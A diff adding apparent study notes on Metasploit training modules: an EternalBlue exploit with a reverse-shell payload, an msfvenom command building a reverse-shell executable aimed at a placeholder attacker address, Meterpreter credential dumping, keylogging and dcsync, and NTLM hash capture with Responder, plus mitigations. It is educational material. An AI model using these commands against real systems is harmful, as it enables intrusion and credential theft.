@@ -908,3 +908,120 @@ Metasploit is no longer an intimidating “black box.” By understanding its mo
 - Centrally managing access to multiple compromised systems.
 
 > **Key Skill Acquired:** The ability to navigate the `msfconsole` interface, search for modules relevant to a target, and apply the fundamental flow of `use -> configure -> run` to execute them.
+
+## Module Completed: Metasploit: Exploitation ##
+
+**Completion Date:** [2025/09/30]
+
+1. Module Objective
+Demonstrate the complete Metasploit workflow, from passive reconnaissance to remote code execution (RCE).
+
+Master project data management (hosts, services, workspaces) within the Metasploit console.
+
+2. Key Project Phases (High-Level Commands)
+Phase    Demonstrated Task    Essential Commands
+I. Setup & Management    
+Initialize the database and create the project workspace.
+
+systemctl start postgresql, sudo -u postgres msfdb init, workspace -a [name] 
+
+II. Reconnaissance    
+Scan services and automatically save hosts to the database.
+
+db_nmap -sV [target IP] / 
+
+hosts / services 
+
+III. Exploitation (Example: MS17-010)    
+Use the exploit module and configure the 
+
+Reverse Shell payload.
+
+use exploit/windows/smb/ms17_010_eternalblue / 
+
+set payload generic/shell_reverse_tcp / 
+
+set LHOST [Your IP] / 
+
+run 
+
+IV. Post-Exploitation    
+Management of multiple accesses (sessions) in the background.
+
+sessions -l / sessions -i [ID]
+
+
+Export to spreadsheets
+3. Customization Tools (MSFVENOM)
+
+Function: Creation of independent payloads for scenarios where a direct exploit is not used (e.g., in a file upload vulnerability on a website).
+
+Key Command Example:
+
+Bash
+
+# Creating a Windows executable file that calls the attacking machine
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+
+The Handler: The crucial step is to configure the listener to catch that connection: use exploit/multi/handler.
+
+4. Conclusions and Defense
+Mitigation: How was the vulnerability that was attacked defended? (E.g., “The MS17-010 vulnerability was mitigated by installing the Microsoft security patch and disabling SMBv1.”)
+
+
+Lesson learned: (e.g., “The importance of not skipping the information gathering phase, as the success of the exploit depends on knowing the services running on the target.”)
+
+## Module Completed: Metasploit: Meterpeter ##
+
+**Completion Date:** [2025/09/30]
+
+1. Module Objective: Post-Exploitation with Meterpreter
+Demonstrate complete control over a remote host after a successful exploit.
+
+Master critical commands for management, lateral movement, and credential theft.
+
+2. Survival and Stealth Commands (Core Commands)
+Key Task    Command/Technique    Notes and Value
+Stability    migrate [PID]    
+Migrated the session to a stable process (e.g., a system service) to avoid losing the connection if the initial process fails.
+
+Identity    getuid    
+View the privilege level (Ideally: 
+
+NT AUTHORITY\\SYSTEM) to know what to attempt next.
+
+Listing    ps    
+Processes were listed to identify targets for migration and obtain system information.
+
+Native Access    shell    
+Obtain a normal command line from the victim to execute binaries not available in Meterpreter.
+
+
+Export to Spreadsheets
+3. Information and Credential Gathering (The Gold)
+
+Password Hashes: The hashdump command was used to extract NTLM hashes from the Windows SAM database.
+
+Next Step: These hashes are valuable for Pass-the-Hash attacks or for cracking the password.
+
+
+Keystroke Capture: A keylogger was configured using keyscan_start and keyscan_dump to capture user activity.
+
+
+Important Files: Use search -f [name] to locate specific files (such as flags in CTFs or configuration files).
+
+4. Advanced Post-Exploitation (Bonus Track)
+
+Additional Modules: Demonstrated how to use the load kiwi command to access more powerful tools for credential extraction, such as creds_all and dcsync.
+
+
+Code Execution: Used the load python (or Ruby) command to execute scripts directly in memory.
+
+## Module Completed: Moniker Link ##
+**Completion Date: [2025/10/01]
+Section    Content    Value for Employment
+I. Concept of NTLM    Brief explanation: NTLM does not send the password, but rather a hash (a digital fingerprint) that can be decrypted or used in a Pass-the-Hash attack.    Demonstrates knowledge of Windows authentication.
+
+II. The Role of Responder    Responder is a passive man-in-the-middle that listens for specific requests (such as NetBIOS/LLMNR). Explain: Responder impersonates a server so that the victim sends the hash to it.    Demonstrates knowledge of network and attack tools.
+
+III. The Defense How to mitigate this attack: 1. Disable LLMNR/NetBIOS. 2. Enforce SMB signing. 3. Use Kerberos authentication instead of NTLM.    High Value: Demonstrates that you know how to secure, not just attack.
